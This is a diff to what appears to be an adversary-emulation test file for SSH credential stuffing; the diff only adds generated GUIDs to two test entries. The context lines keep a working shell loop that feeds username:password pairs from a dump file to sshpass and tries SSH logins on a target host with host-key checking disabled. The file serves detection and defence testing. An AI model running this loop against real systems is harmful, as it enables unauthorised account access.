@@ -4,6 +4,7 @@ display_name: 'Brute Force: Credential Stuffing'
 
 atomic_tests:
 - name: SSH Credential Stuffing From Linux
+  auto_generated_guid: 4f08197a-2a8a-472d-9589-cd2895ef22ad
   description: |
     Using username,password combination from a password dump to login over SSH.
 
@@ -33,6 +34,7 @@ atomic_tests:
       for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
 
 - name: SSH Credential Stuffing From MacOS
+  auto_generated_guid: d546a3d9-0be5-40c7-ad82-5a7d79e1b66b
   description: |
     Using username,password combination from a password dump to login over SSH.
 
